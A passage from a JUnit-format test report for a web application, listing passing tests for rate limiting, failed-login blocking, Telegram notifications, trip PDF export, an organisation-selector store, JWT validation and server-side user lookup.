    <testcase classname="rate limit configs LOGIN_RATE_LIMIT: 5 requests per 15 minutes" name="rate limit configs LOGIN_RATE_LIMIT: 5 requests per 15 minutes" time="0.003">
    </testcase>
    <testcase classname="rate limit configs PASSWORD_RESET_RATE_LIMIT: 3 requests per hour" name="rate limit configs PASSWORD_RESET_RATE_LIMIT: 3 requests per hour" time="0.002">
    </testcase>
    <testcase classname="rate limit configs FACE_LOGIN_RATE_LIMIT: 10 requests per 15 minutes" name="rate limit configs FACE_LOGIN_RATE_LIMIT: 10 requests per 15 minutes" time="0.002">
    </testcase>
    <testcase classname="rate limit configs GENERAL_RATE_LIMIT: 100 requests per 15 minutes (no block)" name="rate limit configs GENERAL_RATE_LIMIT: 100 requests per 15 minutes (no block)" time="0.001">
    </testcase>
    <testcase classname="applyRateLimit returns null when rate limit not exceeded" name="applyRateLimit returns null when rate limit not exceeded" time="0.002">
    </testcase>
    <testcase classname="applyRateLimit returns 429 when rate limit exceeded" name="applyRateLimit returns 429 when rate limit exceeded" time="0.003">
    </testcase>
    <testcase classname="applyRateLimit includes Retry-After and X-RateLimit-* headers in 429" name="applyRateLimit includes Retry-After and X-RateLimit-* headers in 429" time="0.002">
    </testcase>
    <testcase classname="applyRateLimit auto-blocks when remaining &lt;= -maxRequests" name="applyRateLimit auto-blocks when remaining &lt;= -maxRequests" time="0.001">
    </testcase>
    <testcase classname="applyRateLimit does NOT auto-block without blockDurationMs" name="applyRateLimit does NOT auto-block without blockDurationMs" time="0.001">
    </testcase>
    <testcase classname="handleFailedLogin logs failed login attempt with IP and riskScore" name="handleFailedLogin logs failed login attempt with IP and riskScore" time="0.001">
    </testcase>
    <testcase classname="handleFailedLogin logs failed login without riskScore" name="handleFailedLogin logs failed login without riskScore" time="0">
    </testcase>
    <testcase classname="handleFailedLogin blocks key when failed count &gt;= 5" name="handleFailedLogin blocks key when failed count &gt;= 5" time="0.001">
    </testcase>
    <testcase classname="handleFailedLogin does NOT block when failed count &lt; 5" name="handleFailedLogin does NOT block when failed count &lt; 5" time="0">
    </testcase>
  </testsuite>
  <testsuite name="sendTelegramNotification" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.678" tests="7">
    <testcase classname="sendTelegramNotification returns false when token is missing" name="sendTelegramNotification returns false when token is missing" time="0.012">
    </testcase>
    <testcase classname="sendTelegramNotification returns false when chatId is missing" name="sendTelegramNotification returns false when chatId is missing" time="0.002">
    </testcase>
    <testcase classname="sendTelegramNotification returns false when both are missing" name="sendTelegramNotification returns false when both are missing" time="0.003">
    </testcase>
    <testcase classname="sendTelegramNotification returns true when API call succeeds" name="sendTelegramNotification returns true when API call succeeds" time="0.003">
    </testcase>
    <testcase classname="sendTelegramNotification returns false when API call fails" name="sendTelegramNotification returns false when API call fails" time="0.002">
    </testcase>
    <testcase classname="sendTelegramNotification returns false when fetch throws" name="sendTelegramNotification returns false when fetch throws" time="0.003">
    </testcase>
    <testcase classname="sendTelegramNotification sends HTML parse mode" name="sendTelegramNotification sends HTML parse mode" time="0.003">
    </testcase>
  </testsuite>
  <testsuite name="exportTripsToPDF" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.652" tests="7">
    <testcase classname="exportTripsToPDF returns success object" name="exportTripsToPDF returns success object" time="0.003">
    </testcase>
    <testcase classname="exportTripsToPDF calls pdfMake.createPdf" name="exportTripsToPDF calls pdfMake.createPdf" time="0.001">
    </testcase>
    <testcase classname="exportTripsToPDF calls download on the pdf document" name="exportTripsToPDF calls download on the pdf document" time="0.001">
    </testcase>
    <testcase classname="exportTripsToPDF includes summary statistics in document definition" name="exportTripsToPDF includes summary statistics in document definition" time="0.001">
    </testcase>
    <testcase classname="exportTripsToPDF includes trip details table with headers" name="exportTripsToPDF includes trip details table with headers" time="0.001">
    </testcase>
    <testcase classname="exportTripsToPDF includes all trips in the table body" name="exportTripsToPDF includes all trips in the table body" time="0.001">
    </testcase>
    <testcase classname="exportTripsToPDF handles empty trips gracefully" name="exportTripsToPDF handles empty trips gracefully" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="useOrgSelectorStore" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.617" tests="7">
    <testcase classname="useOrgSelectorStore initial state starts with null selectedOrgId" name="useOrgSelectorStore initial state starts with null selectedOrgId" time="0.002">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId sets selectedOrgId to given value" name="useOrgSelectorStore setSelectedOrgId sets selectedOrgId to given value" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId sets selectedOrgId to null when passed null" name="useOrgSelectorStore setSelectedOrgId sets selectedOrgId to null when passed null" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore setSelectedOrgId overwrites previous selection" name="useOrgSelectorStore setSelectedOrgId overwrites previous selection" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore clearSelection resets selectedOrgId to null" name="useOrgSelectorStore clearSelection resets selectedOrgId to null" time="0.001">
    </testcase>
    <testcase classname="useOrgSelectorStore clearSelection is safe to call when already null" name="useOrgSelectorStore clearSelection is safe to call when already null" time="0">
    </testcase>
    <testcase classname="useOrgSelectorStore persist persists selectedOrgId to localStorage" name="useOrgSelectorStore persist persists selectedOrgId to localStorage" time="0">
    </testcase>
  </testsuite>
  <testsuite name="decodeJwt" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.582" tests="17">
    <testcase classname="decodeJwt decodes a valid JWT payload" name="decodeJwt decodes a valid JWT payload" time="0.003">
    </testcase>
    <testcase classname="decodeJwt returns null for malformed token" name="decodeJwt returns null for malformed token" time="0.001">
    </testcase>
    <testcase classname="decodeJwt returns null for token with less than 3 parts" name="decodeJwt returns null for token with less than 3 parts" time="0.001">
    </testcase>
    <testcase classname="decodeJwt returns null for invalid base64 payload" name="decodeJwt returns null for invalid base64 payload" time="0.001">
    </testcase>
    <testcase classname="decodeJwt returns null for invalid JSON payload" name="decodeJwt returns null for invalid JSON payload" time="0.001">
    </testcase>
    <testcase classname="isTokenExpired returns true for expired token" name="isTokenExpired returns true for expired token" time="0">
    </testcase>
    <testcase classname="isTokenExpired returns false for non-expired token" name="isTokenExpired returns false for non-expired token" time="0">
    </testcase>
    <testcase classname="isTokenExpired respects buffer seconds" name="isTokenExpired respects buffer seconds" time="0.001">
    </testcase>
    <testcase classname="isTokenExpired returns true for token without exp field" name="isTokenExpired returns true for token without exp field" time="0.001">
    </testcase>
    <testcase classname="isTokenExpired returns true for malformed token" name="isTokenExpired returns true for malformed token" time="0">
    </testcase>
    <testcase classname="getTokenExpiryTime returns milliseconds until expiry" name="getTokenExpiryTime returns milliseconds until expiry" time="0.001">
    </testcase>
    <testcase classname="getTokenExpiryTime returns negative value for expired token" name="getTokenExpiryTime returns negative value for expired token" time="0.001">
    </testcase>
    <testcase classname="getTokenExpiryTime returns null for malformed token" name="getTokenExpiryTime returns null for malformed token" time="0">
    </testcase>
    <testcase classname="validateToken returns true for valid non-expired token" name="validateToken returns true for valid non-expired token" time="0">
    </testcase>
    <testcase classname="validateToken returns false for expired token" name="validateToken returns false for expired token" time="0">
    </testcase>
    <testcase classname="validateToken returns false for malformed token" name="validateToken returns false for malformed token" time="0.001">
    </testcase>
    <testcase classname="validateToken returns false for null/undefined/empty" name="validateToken returns false for null/undefined/empty" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="getServerUser" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:23:05" time="0.622" tests="5">
    <testcase classname="getServerUser returns JWT payload when hr-auth-token cookie is valid" name="getServerUser returns JWT payload when hr-auth-token cookie is valid" time="0.004">
    </testcase>
    <testcase classname="getServerUser falls back to NextAuth when JWT cookie is missing" name="getServerUser falls back to NextAuth when JWT cookie is missing" time="0.001">
    </testcase>
    <testcase classname="getServerUser returns null when both auth methods fail" name="getServerUser returns null when both auth methods fail" time="0.001">
    </testcase>
    <testcase classname="getServerUser falls back to NextAuth when JWT cookie is invalid" name="getServerUser falls back to NextAuth when JWT cookie is invalid" time="0.001">
    </testcase>
    <testcase classname="getServerUser returns null when NextAuth throws" name="getServerUser returns null when NextAuth throws" time="0">
    </testcase>
  </testsuite>
</testsuites>